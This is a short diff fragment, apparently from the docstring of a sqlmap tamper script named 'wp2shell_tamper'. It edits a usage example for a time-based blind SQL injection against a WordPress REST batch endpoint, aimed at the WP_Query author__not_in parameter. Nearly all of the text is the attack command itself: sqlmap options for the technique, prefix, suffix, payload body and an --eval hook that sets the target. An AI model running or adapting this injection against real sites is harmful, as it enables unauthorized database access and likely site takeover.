@@ -7,7 +7,8 @@ reach the vulnerable WP_Query::author__not_in parameter.
 
 Usage:
   sqlmap -u "http://target/wp-json/batch/v1" \
-    --data='{"validation":"normal","requests":[]}' \
+    --data='{"placeholder":"INJECT"}' \
+    --method=POST \
     --tamper=wp2shell_tamper \
     --technique=T \
     --time-sec=3 \
@@ -15,7 +16,7 @@ Usage:
     --prefix="0)" \
     --suffix="-- -" \
     --dbms=mysql \
-    -p "INJECT" \
+    -p placeholder \
     --eval="import wp2shell_tamper; wp2shell_tamper.init_target('TARGET_URL')"
 
 Or using the built-in standalone mode:
